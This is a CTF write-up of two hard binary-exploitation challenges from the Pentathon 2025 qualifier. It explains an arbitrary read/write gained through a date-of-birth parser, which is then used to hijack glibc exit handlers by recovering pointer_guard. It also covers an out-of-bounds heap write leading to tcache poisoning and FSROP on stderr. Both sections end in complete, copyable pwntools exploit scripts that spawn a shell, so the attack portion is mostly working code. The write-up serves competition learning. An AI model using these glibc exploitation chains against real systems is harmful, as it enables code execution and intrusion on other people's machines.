---
layout: default
title: "Pentathon-2025 Qualifier Round Writeups"
description: "Writeups of Pentathon 2025 Qualifier round pwn challenges."
og_description: "Writeups of pwn challenges(Placeholder & Handler)."
og_type: "ctf writeup"
keywords: "writeups,Sarvesh Aadhithya,CTFs, Pentathon, 2025,zoozoo-sec, zoozoo"

permalink: /writeups/Pentathon2025/
---

<!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />

<section id="back" class="back">
<div id="challenge-links">
        <h1 class="text"><code>
NCIIPC-AICTE Pentathon 2025</code></h1>
        <ul>
            <li><a href="#placeholder"><code>PlaceHolder</code></a></li>
            <li><a href="#handout"><code>Handout</code></a></li>
        </ul>
    </div>
</section>

<section id="back">
<section id="blueback" class="container">
    <div id="placeholder" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Placeholder </span><br>
            <b>Category:</b> Binary Exploitation (pwn) <br>
            <b>Difficulty:</b> Hard<br>
            <p><br>
            Alright, let’s talk about this binary.
               <br> After popping it open, I quickly noticed it had just two functions:<code>main()</code> and <code>exit_program()</code>. It starts with a harmless-looking prompt for Date of Birth in <code>dd-mm-yyyy</code> format — but under the hood, it’s a beautifully disguised arbitrary read/write vulnerability waiting to be exploited.
            </p>
        </div>
        <div class="section-content">
            <h2>Initial Observations</h2>
            <p>Take a look at this main() snippet:</p>
             <img src="{{ '/writeups/Pentathon2025/assets/first.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            <pre><code class="language-c">strtoul(nptr, 0LL, 16);</code></pre>
            <p>
                Yeah, that right there. It takes the parsed DOB, strips the dashes, and parses it as a hexadecimal address.<br><code>For example</code>, inputting: <code>41-41-4141</code> turns into <code>0x41414141</code>. That value is then used as an offset to a memory array with read/write access. This gives us a byte-wise arbitrary read/write primitive.<br>Boom. User input is now being interpreted as a memory address.
                <br>They go and treat this value as an offset for the memory array. And allow read/write access.<br>You see where this is going?
                <img src="{{ '/writeups/Pentathon2025/assets/second.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            </p>
            <p>This gives us an arbitrary read/write primitive. Byte-by-byte, granted, but We’ll take it.</p>
        </div>
        <div class="section-content">
            <h3>Possible Attack Surface</h3>
            <ul>
                <li>ROP on stack? Nah.<code> No return instruction.</code></li>
                <li>GOT overwrite? Forget it.<code> FULLRELRO</code> is enabled.</li>
            </ul>
            <p>
                Even though we can leak libc via puts from the GOT, we can't overwrite GOT entries.<br>At this point, you'd think it's a dead end. But then...<br>Why would the author place the <code>exit()</code> in the <code>exit_program()</code>? Is he trying to hint something ?<br><code>Suspicious. Very suspicious.</code>
            </p>
        </div>
        <div class="section-content">
            <h3>Enter Exit Handlers </h3>
            <p>
               Now I remembered seeing some deep wizardry involving exit handlers before, so I went hunting. And yeah, jackpot.<br>Helpful writeups I followed:
                <ul>
                    <li><a href="https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html">Binholic</a></li>
                    <li><a href="https://blog.rop.la/en/exploiting/2024/06/11/code-exec-part1-from-exit-to-system.html">rop.la</a></li>
                    <li><a href="https://ctftime.org/writeup/34804">ctftime.org writeup</a></li>
                </ul>
            </p>
            <h3>In short:</h3>
            <p>
                When <code>exit()</code> is called, glibc executes internal exit handlers (a.k.a. __exit_funcs). These include things like <code>_dl_fini</code> – a function pointer stored in a struct, mangled via a secret pointer_guard stored in the <code>FS</code> segment at offset 0x30. The pointers are mangled because modern libc has internal pointer protection—meaning critical function pointers (like those used during exit()) are mangled using a secret pointer_guard to prevent direct tampering.
            </p>
            <p>If you can:
                <ul>
                    <li>Leak the <code>pointer_guard</code> (via known encrypted value and known original pointer)</li>
                    <li>Encrypt your desired function pointer (like system) using that same method</li>
                    <li>Overwrite the function pointer in <code>__exit_funcs</code></li>
                </ul>
            ...then when <code>exit()</code> runs, it'll call your payload.<br>
            Cool, right?<br>
            Let’s implement this.
            </p>
        </div>
        <div class="section-content">
            <h3>Exploit Strategy</h3>
            <p>
            <ol>
                <li>Leak libc base via <code>puts@GOT</code>.</li>
                <li>Compute libc base.</li>
                <li>Find <code>__exit_funcs</code> and the mangled <code>_dl_fini</code>in libc</li>
                <li>Oops, Can’t calculate _dl_fini  directly as it is not an exported functions (Need an unique way to find out)</li>
                <li>Read mangled pointer to <code>_dl_fini</code>,Recover the <code>pointer_guard</code>.</li>
                <li>Encrypt <code>system()</code> using the same mangling method.</li>
                <li>Overwrite the  exit handler and pass <code>/bin/sh</code> as an argument.</li>
                <li>Trigger <code>exit()</code> and pop the shell.</li>
            </ol>
            </p>
        </div>
        <div class="section-content">
            <h3>Pointer Mangling Utilities</h3>
            <p>Thanks to <code>rop.la</code>, Used the following functions from the  author's post:</p>
            <pre><code class="language-python">rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return list(p64(rol(v ^ key, 0x11, 64)))</code></pre>
        </div>
        <div class="section-content">
            <p>Here’s the full Python script skeleton used to perform the attack:</p>
            <div class="h4-wrapper">
                <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python">#!/bin/python3

from pwn import *
memory  = 0x404030

def conn():
    context.arch = 'amd64'
    context.log_level = 'error'
    elf = ELF('./chall', checksec=False)
    libc = ELF('./libc.so.6', checksec=False)    
    is_debug = any(arg.lower() == 'debug' for arg in sys.argv[1:])
    if is_debug:
        p = process('./chall')
    else:
        p = remote('pwn.traboda.net', 54563)
    return p,elf,libc

def banner():print("\n[*] System pwned\n[*] Shell spawned\n[*] Get the flag!")

def write(address, data: list[int],p):
    for i in range(len(data)):
        p.recvuntil(b'Enter date of birth (dd-mm-yyyy) or \'exit\' to quit: ')
        p.sendline(formatter(address + i - memory))
        p.recvuntil(b'Read (r) or Write (w)?')
        p.sendline(b'w')
        p.recvuntil(b'Enter character to write: ')
        p.sendline(str(data[i]).encode())

def read(where, length, p):
    leak = 0
    for i in range(length):
        try:
            p.recvuntil(b'Enter date of birth (dd-mm-yyyy) or \'exit\' to quit: ')
            p.sendline(formatter(where + i))
            p.recvuntil(b'Read (r) or Write (w)?')
            p.sendline(b'r')
            response = p.recvline(timeout=5)
            leak = int(response.decode().split(':')[1].strip()) << 8*i | leak
        except EOFError:
            print(f"Error reading address: {hex(where + i)}")
            break  # Or handle the error as needed
    return leak

def formatter(val):
    hex_val = hex(val)[2:]
    hex_val = str(hex_val.zfill(16))
    return hex_val[:2].encode() + b'-' + hex_val[2:4].encode() + b'-' + hex_val[4:].encode()

def main():
    p,e,libc = conn()

    # Stage 1 - leak the libc base address

    #leak puts and calculate libc base
    libc.address = read(0xffffffffffffff78,6,p) - libc.symbols['puts']

    #address of the function _dl_fini
    orig_handler = libc.address + 0x219380
    #address of __exit_func (initial)
    exit_funcs_initial = libc.address + 0x204fc0
    
    #Leak mangled pointer of _dl_fini
    encrypted_pointer = read((exit_funcs_initial + 24 - memory),8,p)

    # calculate key
    key = ror(encrypted_pointer, 0x11, 64) ^ orig_handler

    # mangle the address of libc_system
    write(exit_funcs_initial + 24, encrypt(libc.symbols['system'], key),p)
    # set rdi to /bin/sh
    write(exit_funcs_initial + 32, list(p64(libc.address + 0x001cb42f)),p)

    #Get the F3king Shell
    p.recvuntil(b'Enter date of birth (dd-mm-yyyy) or \'exit\' to quit: ')
    p.sendline(b'exit')
    p.recvuntil(b"Exiting the program.")
    banner()
    p.interactive()

if __name__ == "__main__":
    main()
</code></pre>
        </div>
        
        <div class="section-content">
            <h3>TL;DR</h3>
            <ul>
                <li>Arbitrary byte-wise read/write via DOB input.</li>
                <li>ROP & GOT overwrites ruled out by protections.</li>
                <li>Abused glibc exit handlers for RCE.</li>
                <li>Reverse engineered <code>pointer_guard</code> and mangled <code>system()</code>.</li>
                <li>Exited cleanly into a shell</li>
            </ul>
        </div>
    </div>
</section>
</section>

<section id="back">
<section id="blueback" class="container">
    <div id="handout" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Handout </span><br>
            <b>Category:</b> Binary Exploitation (pwn) <br>
            <b>Difficulty:</b> Hard <br>
            <p>
                <br> Right from the jump, this binary gave off serious heap exploitation vibes. We had four conventional options in the menu:
                <ul>
                    <li><code>create_note()</code></li>
                    <li><code>delete_note()</code> </li>
                    <li><code>read_note()</code> </li>
                    <li><code>write_note()</code> </li>
                 </ul>
                Each one whispering “heap corruption” in its own way.
                <br> So naturally, the first step in any heap challenge: <b>Hunt the Primitives.</b>
            </p>
        </div>
        <div class="section-content">
            <h2>Primitive Recon</h2>
            <p>
                Things I was specifically looking for:
                <ul>
                    <li>Use After Free ? Nope. The author was nice enough to NULL out the pointer after freeing:</li>
                    <pre><code class="language-c">*((_QWORD *)&notes + 2 * (int)v1) = 0LL;</code></pre>
                    <li>Double free? Nah.</li>
                    <li>OOB (Out Of Bounds)? Yes, Jackpot.</li>
                </ul>
                <br> <code>write_note()</code> asks for both an index and an offset to write into — and no bounds checks on the offset.<br>
                <code>With this golden ticket</code>, I had full freedom to scribble past chunk boundaries and start crafting overlapping chunks.
            </p>
        </div>
        <div class="section-content">
            <h2>The Overlap</h2>
            <p>
                I massaged the heap into a setup where I had:
                <ul>
                    <li>A large chunk (the <code>Overlapper</code>)</li>
                    <li>A smaller chunk sitting inside it (the <code>Victim</code>)</li>
                </ul>
                By leveraging the <code>OOB write</code> from the large chunk, I nuked the metadata of the larger one using <code>test</code> chunk and teed up a tcache poisoning attack.<br>
                <pre><code class="language-python">test3_chunk = create(15,"test")
overlapper4_chunk = create(15,"Overlapper")
victim5_chunk = create(15,"Victim")
write(2, 24, 0xf1) #the 2 points to the index of chunk "test"</code></pre>
             I poisoned tcache with an arbitrary malloc target. So far, so clean. From here, we’re just going to play with the dynamic allocator
            </p>
        </div>
        <div class="section-content">
            <h2>Leaks & Limitations</h2>
            <p>
                Next step: Info leaks. libc? Heap? Stack? Anything? Let’s go.<br>
                <b><code>Heap leak?</code></b> Easy.<br>
                But <b><code>Libc?</code></b>that was tricky.<br><br>
                At first, I assumed <code>read_note()</code> would be my leak buddy. But plot twist — it doesn't dereference the note. It just prints the pointer.☠️ However, that turned out to be a blessing in disguise. Because that meant... heap pointer leak! Perfect for recovering the <code>tcache pointer mangling key</code> (shifted right by 12).<br><br>
                <b>Also, here's a lovely bug in <code>read_note()</code>:</b><br>
                <img src="{{ '/writeups/Pentathon2025/assets/third.png' | relative_url }}" alt="snippet" class="code-screenshot" />
                <code>if (v1 > 10) // but what about v1 < 0?</code><br>
                Negative indexing was possible. Which meant I could reach libc symbols like <code>stderr@GLIBC_2.2.5</code>, and boom — libc leak obtained.
                <img src="{{ '/writeups/Pentathon2025/assets/fourth.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            </p>
        </div>
        <div class="section-content">
            <h2>Fsrop, but make it Angry</h2>
            <p>
                With no classic read/write primitives, no stack leak, and no easy ROP setup... I knew where this was heading.<br>
                <h4><code>Angry-Fs(r)op.</code></h4><br>
                This one’s beautifully explained in <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/" target="_blank">Kylebot's blog</a>, so I won’t repeat it all.<br><br>
                <b>TL;DR:</b> Overwrite entities such as <code>vtable</code>, <code>wide_data</code> etc of file structs like stderr, stdout, stdin, get code execution when libc uses it in functions like printf(), scanf(), fwrite(), fread() etc.
            </p>
        </div>
        <div class="section-content">
            <h2>Fsrop Strategy</h2>
            <p>
                We found a neat trigger:<br>
                <pre><code>fwrite("\n!! NOTE ACCESS FAIL !!\n", 1uLL, 0x18uLL, stderr);</code></pre>
                This happens when <code>write_note()</code> fails with an invalid index (e.g., >10).<br>
                Perfect candidate for overwriting.<br><br>
                We overwrite <code>stderr</code> file struct, make it land on our fake structures, and boom — hijack the control flow.<br>
                What we overwrote ?<br>
                <ul>
                    <li><code>stderr.flags = 0xfbad2000</code> → marks file readable</li>
                    <li><code>_IO_read_ptr = leaked heap ptr</code> → points to fake wide_data</li>
                    <li><code>stderr.vtable = _IO_wfile_overflow - 0x38</code></li>
                    <li><code>stderr.wide_data = leaked heap ptr</code> → fake stack goes here</li>
                </ul>
                Why the <code>leaked heap ptr</code>? Because we’ll pivot our stack to this memory and drop a nice ROP chain right there.
            </p>
        </div>
        <div class="section-content">
            <h2>ROP Chain Time</h2>
            <p>
                We crafted a fake stack with the usual gadgets:<br>
                <ul>
                    <li>set <code>rdx</code> to NULL</li>
                    <li>set <code>rsi</code> to NULL</li>
                    <li><code>onegadget</code> for that nice little <code>execve()</code> shell</li>
                </ul>
                All written using our <code>write_note()</code> primitive. Here's what the fake stack looked like:<br><br>
                <pre><code class="language-python">stack_pivot = fake_widedata_entry + 168 + 8
pop_rsi = libc + 0x0000000000030081
pop_rdx_r12 = libc + 0x00000000001221f1
shell = b"/bin/zsh"
ret = libc + 0x1aa854
fake_stack = libc + 0xeeaa2
fake_stack = b"\x00"*32
fake_stack += p64(setcontext)
fake_stack += b"\x00"*64
fake_stack += p64(handle)
fake_stack += b"\x00"*48
fake_stack += p64(stack_pivot)
fake_stack += p64(pop_rsi)
fake_stack += p64(0)
fake_stack += p64(pop_rdx_r12)
fake_stack += p64(0)
fake_stack += p64(0)
fake_stack += p64(onegadget)
fake_stack += b"\x00"*8
fake_stack += p64(fake_widedata_entry)</code></pre>
                Finally, to pop the shell, we just needed to trigger:<br>
                <pre><code class="language-python">write(index=15)  # index > 10 triggers fwrite(stderr)</code></pre>
                And…
            </p>
        </div>
        <div class="section-content">
            <h4>BOOM! Shell popped.</h4>
            <p>
                <b>Here is my nice little banner.</b>
<pre><code class="language-python">[*] System pwned
[*] Shell spawned
[*] Get the flag!

$whoami
REDACTED
$
</code></pre>
</p>
</div>
<div class="section-content">
    <div class="h4-wrapper">
        <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python">#!/bin/python3

from pwn import *
import warnings

io = process("./_notes")
warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

def banner():
    print("\n[*] System pwned\n[*] Shell spawned\n[*] Get the flag!")

def create(size,data,proc=io):
    proc.sendline(b"1")
    proc.sendline(str(size))
    proc.sendline(data)


def delete(index,proc=io):
    proc.sendline(b"2")
    proc.sendline(str(index))

def read(index,proc=io):
    proc.sendline(b"3")
    proc.sendline(str(index))
    proc.recvuntil("NOTE: ")
    leak = (proc.recvuntil(b"<"))[:6]
    return int.from_bytes(leak, byteorder='little')

def write(index,offset,value,proc=io):
    proc.sendline(b"4")
    proc.sendline(str(index))
    if value!="no":proc.sendline(str(offset))
    if offset!="no":proc.sendline(value.to_bytes(1,'little'))

#########-LEAKING-AND-CALCULATING-ALL-THE-NECESSARY-MEMORY-ADDRESS-##################
#Leak libc
libc = read(-4) - 2201216 
#stdout address
stderr = libc + 2201216
#vtable hijack
vtable = libc + 2203648
#wide_data 
wide_data = stderr + 160
#setcontext for stack_pivot
setcontext = libc + 358637
#getkeyserv handle for $rdx control from $rdi
handle = libc + 1481888
#####################################################################################

###########-Creating Overlapping chunks at index 3-##################################
dummy1_chunk = create(15,"dummy")
dummy2_chunk = create(15,"dummy")
test3_chunk = create(15,"test")
overlapper4_chunk = create(15,"Overlapper")
victim5_chunk = create(15,"Victim")
write(2,24,0xf1)
#####################################################################################

#######################-USED-FOR-TCACHE-POISONING-###################################
lastpiece6 = create(15,"lastpiece")
lastpiece7 = create(15,"lastpiece_1")
lastpiece8 = create(15,"lastpiece_2")
#####################################################################################

#####################-LEAKING-HEAP-POINTER-&-TCACHE-KEY##############################
heap_pointer = read(0)
key = heap_pointer >> 12 
#####################################################################################

################-OBERWRITING-STDERR-VTABLE-POINTER-##################################
delete(3)
delete(5)
delete(4)
fake_widedata_entry = heap_pointer + 96
#stderr vtable overwrite
overwrite = b"a"*24 + p64(0x21) + p64((key ^ (stderr + 208)))
second_chunk = create(0xe8,overwrite)
victim5_chunk = create(15,"Victim")
overwrite = p64(0) + p64(vtable)
stdout_pointer6 = create(16,overwrite)
#####################################################################################

################-OBERWRITING-STDERR-WIDE_DATA-POINTER-###############################
delete(3)
delete(6)
delete(4)
overwrite = b"a"*24 + p64(0x21) + p64((key ^ (wide_data)))
second_chunk = create(0xe8,overwrite)
victim5_chunk = create(15,"Victim")
overwrite = p64(fake_widedata_entry) + p64(0)
stdout_pointer7 = create(16,overwrite)
#####################################################################################

################-OBERWRITING-STDERR-FLAGS-&_IO_read_ptr-POINTER-#####################
delete(3)
delete(7)
delete(4)
overwrite = b"a"*24 + p64(0x21) + p64((key ^ (stderr)))
second_chunk = create(0xe8,overwrite)
victim5_chunk = create(15,"Victim")
overwrite = p64(0xfbad2000) + (p64(fake_widedata_entry))
stdout_pointer6 = create(18,overwrite)
#####################################################################################

###############-ADDING-ROP-GADGETS-TO-FAKE-STACK-####################################
delete(3)
stack_pivot = fake_widedata_entry + 168 + 8
pop_rsi = libc + 0x0000000000030081
pop_rdx_r12 = libc + 0x00000000001221f1
shell = b"/bin/zsh"
ret = libc + 0x1aa854
onegadget = libc + 0xeeaa2
fake_stack = libc + 0xeeaa2
fake_stack = b"\x00"*32
fake_stack += p64(setcontext)
fake_stack += b"\x00"*64
fake_stack += p64(handle)
fake_stack += b"\x00"*48
fake_stack += p64(stack_pivot)
fake_stack += p64(pop_rsi)
fake_stack += p64(0)
fake_stack += p64(pop_rdx_r12)
fake_stack += p64(0)
fake_stack += p64(0)
fake_stack += p64(onegadget)
fake_stack += b"\x00"*8
fake_stack += p64(fake_widedata_entry)
second_chunk = create(0xe8,fake_stack)
#####################################################################################

####################-TRIGGERING-STDERR-##############################################
write(15,"no","no")
io.recvuntil(b"NO SPACE FOR NEW NOTE !!")
banner()
#####################################################################################

io.interactive()
</code></pre>

        </div>
        
        <div class="section-content">
            <h2>TL;DR:</h2>
            <ul>
                <li>Found OOB write via <code>write_note()</code></li>
                <li>Created overlapping chunks</li>
                <li>Leaked heap pointer → recovered tcache key</li>
                <li>Negative indexing → leaked libc address via <code>stderr</code></li>
                <li>Overwrote <code>stderr</code> file struct using tcache poisoning</li>
                <li>Stack Pivoted to heap using Angry Fsrop</li>
                <li>Triggered shell via <code>onegadget</code> and controlled <code>fwrite()</code></li>
            </ul>
        </div>
    </div>
</section>
</section>

<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="{{ '/writeups/copy.js' | relative_url }}"></script>
